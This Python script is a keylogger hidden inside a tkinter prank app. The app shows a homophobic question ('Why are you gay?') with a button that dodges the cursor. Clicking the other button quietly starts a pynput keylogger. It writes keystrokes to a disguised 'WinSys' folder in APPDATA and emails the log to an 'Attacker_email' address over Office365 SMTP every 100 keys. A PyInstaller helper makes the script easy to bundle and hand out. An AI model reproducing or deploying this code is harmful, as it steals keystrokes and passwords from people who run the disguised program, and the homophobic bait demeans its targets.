import os
import sys
import smtplib
import threading
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import tkinter as tk
from tkinter import Toplevel
from PIL import Image, ImageTk
import random

# ========== CONFIGURATION ==========
def resource_path(relative_path):
    """Permet de retrouver le bon chemin (PyInstaller ou non)"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

sender_email = "Victim_email"
receiver_email = "Attacker_email"
password = "Your_password"  # ⚠️ Remplace par un mot de passe d'application Outlook

key_counter = 0
KEY_LIMIT = 100
lock = threading.Lock()

# Dossier caché pour les logs
log_dir = os.path.join(os.getenv('APPDATA'), "WinSys")
os.makedirs(log_dir, exist_ok=True)
keylog_file = os.path.join(log_dir, "keylog.txt")
# ===================================


# ---------- ENVOI PAR MAIL ----------
def send_log_email():
    if not os.path.exists(keylog_file):
        return

    msg = MIMEMultipart()
    msg["Subject"] = "Keylogger Report"
    msg["From"] = sender_email
    msg["To"] = receiver_email

    with open(keylog_file, "rb") as f:
        part = MIMEApplication(f.read(), Name="keylog.txt")
        part['Content-Disposition'] = 'attachment; filename="keylog.txt"'
        msg.attach(part)

    try:
        with smtplib.SMTP("smtp.office365.com", 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.send_message(msg)
        print("✅ Email envoyé avec succès.")
    except Exception as e:
        print(f"❌ Erreur lors de l'envoi de l'email : {e}")

    open(keylog_file, "w").close()  # Réinitialiser le fichier après l'envoi


# ---------- KEYLOGGER ----------
def start_keylogger():
    def on_press(key):
        global key_counter
        try:
            key_str = key.char
        except AttributeError:
            key_str = f"[{key}]"

        with lock:
            with open(keylog_file, "a") as log:
                log.write(key_str)
            key_counter += 1

            if key_counter >= KEY_LIMIT:
                send_log_email()
                key_counter = 0

    listener = keyboard.Listener(on_press=on_press)
    listener.start()


# ---------- INTERFACE GRAPHIQUE ----------
rainbow_colors = ["red", "orange", "yellow", "green", "blue", "indigo", "violet"]
rainbow_active = False

def move_away(event):
    x = random.randint(50, 300)
    y = random.randint(50, 300)
    button1.place(x=x, y=y)

def change_bg_color(index=0):
    global rainbow_active
    if rainbow_active:
        root.configure(bg=rainbow_colors[index])
        root.after(300, change_bg_color, (index + 1) % len(rainbow_colors))

def reset_interface():
    global rainbow_active
    rainbow_active = False
    if "popup" in globals():
        popup.destroy()
    root.configure(bg="#f0f0f0")
    button1.place(x=150, y=150)
    button2.pack(pady=20)

def show_message_with_image():
    global popup, rainbow_active
    rainbow_active = True

    popup = Toplevel(root)
    popup.title("Confirmation")
    popup.geometry("400x400")
    popup.configure(bg="white")

    label = tk.Label(popup, text="You are gay!", font=("Arial", 16, "bold"), fg="black", bg="white")
    label.pack(pady=10)

    img_label_popup = tk.Label(popup, image=img, bg="white")
    img_label_popup.pack()

    change_bg_color()
    root.after(10000, reset_interface)

def respond():
    show_message_with_image()
    button1.place_forget()
    button2.pack_forget()

    # Lancer le keylogger au clic
    threading.Thread(target=start_keylogger, daemon=True).start()


# ---------- LANCEMENT DE L'APP ----------
root = tk.Tk()
root.title("Question Form")
root.geometry("500x500")
root.configure(bg="#f0f0f0")

question_label = tk.Label(root, text="Why are you gay?", font=("Arial", 16, "bold"), fg="black", bg="#f0f0f0")
question_label.pack(pady=20)

button1 = tk.Button(root, text="I'm not gay!", font=("Arial", 12, "bold"), bg="red", fg="white", relief="raised")
button1.place(x=150, y=150)
button1.bind("<Enter>", move_away)

button2 = tk.Button(root, text="Who says I'm gay?", command=respond, font=("Arial", 12, "bold"),
                    bg="purple", fg="white", relief="raised")
button2.pack(pady=20)

img_path = resource_path("assets/wayg.jpg")
img = Image.open(img_path)
img = img.resize((250, 250))
img = ImageTk.PhotoImage(img)


root.mainloop()
